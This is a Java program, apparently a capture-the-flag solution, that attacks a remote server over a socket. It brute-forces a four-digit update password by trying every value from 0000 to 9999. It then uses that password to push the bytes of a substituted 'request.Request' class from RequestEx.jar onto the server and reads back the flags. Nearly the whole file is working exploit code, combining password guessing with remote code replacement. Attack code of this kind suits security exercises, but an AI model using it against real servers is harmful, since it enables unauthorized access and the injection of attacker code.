package solution;

import request.Request;

import java.io.*;
import java.net.Socket;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Enumeration;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

/**
 * Created by masoud on 5/18/14.
 */
public class Main {

    public static void main(String args[]) throws IOException, ClassNotFoundException, InterruptedException {

        if (args.length != 2) {
            System.out.print("Usage: Solution.jar <Server IP> <Server Port Number>\n");
            return;
        }

        //Loading RequestEx Class
        Class reqEx = null;
        JarFile reqExJar = new JarFile("RequestEx.jar");
        InputStream reqExinp = null;
        Enumeration reqExe = reqExJar.entries();
        URL[] reqExurls = {new URL("jar:file:" + "RequestEx.jar" + "!/")};
        URLClassLoader reqExcl = URLClassLoader.newInstance(reqExurls);

        while (reqExe.hasMoreElements()) {
            JarEntry reqExje = (JarEntry) reqExe.nextElement();
            if (reqExje.isDirectory() || !reqExje.getName().endsWith(".class")) {
                continue;
            }

            // -6 because of .class
            reqExinp = reqExJar.getInputStream(reqExje);
            String className = reqExje.getName().substring(0, reqExje.getName().length() - 6);
            className = className.replace('/', '.');
            if (className.equals("request.Request")) {
                reqEx = reqExcl.loadClass(className);
                System.out.println("RequestEx Loaded!");
                break;
            }
        }

        if (reqEx == null) {
            System.err.println("Error loading classes!");
            return;
        }

        ByteArrayOutputStream outb = new ByteArrayOutputStream();
        int a = reqExinp.read();
        while (a != -1) {
            outb.write(a);
            a = reqExinp.read();
        }
        byte[] buff = outb.toByteArray();


        //Cracking Password
        System.out.println("\nCracking update password:");
        Socket s = new Socket(args[0], Integer.parseInt(args[1]));
        Request reqObj = new Request();
        reqObj.setType(4);
        String pass = "";

        MainLoop:
        for (int i = 0; i < 10; i++)
            for (int j = 0; j < 10; j++)
                for (int k = 0; k < 10; k++)
                    for (int l = 0; l < 10; l++) {
                        StringBuilder builder = new StringBuilder();
                        builder.append(i);
                        builder.append(j);
                        builder.append(k);
                        builder.append(l);
                        reqObj.setArgument(builder.toString());
                        System.out.println(builder.toString());

                        ObjectOutputStream out = new ObjectOutputStream(s.getOutputStream());
                        out.writeObject(reqObj);

                        try {
                            ObjectInputStream in = new ObjectInputStream(s.getInputStream());
                            Request inp = (Request) in.readObject();
                        } catch (Exception ex) {
                            System.out.println("Password Cracked!\n");
                            pass = builder.toString();
                            break MainLoop;
                        }
                    }

        s.close();
        Thread.sleep(2000);


        //Updating
        System.out.println("Updating server...");
        s = new Socket(args[0], Integer.parseInt(args[1]));
        reqObj.setArgument(pass);
        ObjectOutputStream out = new ObjectOutputStream(s.getOutputStream());
        out.writeObject(reqObj);
        s.getOutputStream().write(buff, 0, buff.length);
        Thread.sleep(2000);

        //Reading result
        System.out.println("\nReading result to get flags...\n");
        ObjectInputStream in = new ObjectInputStream(s.getInputStream());
        Request inp = (Request) in.readObject();
        System.out.println(inp.getResult());
    }
}
